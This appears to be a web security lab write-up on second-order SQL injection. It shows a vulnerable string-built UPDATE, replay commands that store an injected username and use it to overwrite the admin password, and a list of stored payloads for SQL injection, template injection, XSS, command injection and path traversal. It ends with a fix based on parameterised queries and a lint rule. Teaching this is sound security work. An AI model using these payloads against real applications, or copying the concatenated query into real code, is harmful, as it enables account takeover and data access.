# Lab 19 — Rename

## Every query here uses bound parameters

```python
DB.execute("SELECT 1 FROM users WHERE username = ?", (user,))
DB.execute("INSERT INTO users VALUES (?, ?, 'user')", (user, pw))
DB.execute("SELECT role FROM users WHERE username = ? AND password = ?", (...))
```

Three of the four. Grep this file for string formatting and you find one line,
and it does not touch a request:

```python
sql = f"UPDATE users SET password = '{new}' WHERE username = '{row[0]}'"
```

`row[0]` came **out of the database**. It is therefore trusted — which is the
belief the whole bug rests on. Trust does not survive a round trip through
storage. Data is not clean because it was stored; it is clean because it is
handled correctly at every point of *use*.

## The two halves

**Store the payload.** `register` binds its parameter, so the quote lands in the
table verbatim, exactly as written:

```bash
h5i websec replay req_0 --session lab19 --create \
    --set method=POST --set path=/api/register \
    --set header.Content-Type=application/json \
    --set "json.username=zz' OR username='admin" --set json.password=pw1
```

Nothing happens. That is the point — the payload is inert, sitting in a row,
waiting for a code path that concatenates.

**Detonate it.** `change` authenticates you as the account you just made, reads
the stored username back, and pastes it into an `UPDATE`:

```sql
UPDATE users SET password = 'owned' WHERE username = 'zz' OR username='admin'
```

The `WHERE` clause now matches the administrator, and the statement rewrites
their password.

```bash
h5i websec replay req_0 --session lab19 --create \
    --set method=POST --set path=/api/password \
    --set "json.username=zz' OR username='admin" \
    --set json.password=pw1 --set json.new=owned

h5i websec replay req_0 --session lab19 --create \
    --set method=POST --set path=/api/login \
    --set json.username=admin --set json.password=owned
```

## Why this is hard to find

The injection point and the sink are in different requests, different endpoints,
and often different services and different weeks. Consequences:

* **Scanners miss it.** A scanner sends a payload and reads the response to
  *that* request. Here the response is `{"ok": true}`.
* **The payload must survive storage** — column length, character set, and any
  normalisation on the way in. Check what actually came back before concluding
  the injection failed.
* **You must revisit.** The discipline is: after storing anything, walk the
  application again looking at every place the stored value is displayed or used.

## What to store

Payloads that are inert on the way in and dangerous on the way out. Use markers
you can search for:

```
zz' OR username='admin        SQL, ending up in a WHERE
zz'||(SELECT ...)||'          SQL, in a concatenation
{{7*7}}  ${7*7}  <%= 7*7 %>   SSTI on a rendered profile (Lab 17)
<script>...</script>          stored XSS (Lab 21)
$(id)  `id`  ; id             a value that reaches a command line (Lab 16)
../../etc/passwd              a stored path later used to open a file
http://collector/             a stored URL that something later fetches (Lab 25)
```

Good places to store them: username, display name, email, company name,
filename, address, user-agent (Lab 29), a comment, a tag, a webhook URL, a
"notes" field. Good places to look for the sink: admin panels, exports (CSV,
PDF), reports, emails, log viewers, search indexes, and any batch job.

## The fix

Parameterise **every** query, not the ones that touch a request. The rule is
"the SQL text is a constant, always", and it is checkable mechanically — a lint
rule that bans string formatting anywhere near `execute` finds this bug where a
code review does not.

Note also that this endpoint uses `executescript`, which permits several
statements. Where the driver allows stacked queries, the same injection is a
`; DROP TABLE`, not merely an over-broad `WHERE`.

## h5i technique

Chaining three replays inside one session, so the whole two-request exploit —
store, then detonate — is a single reproducible record.
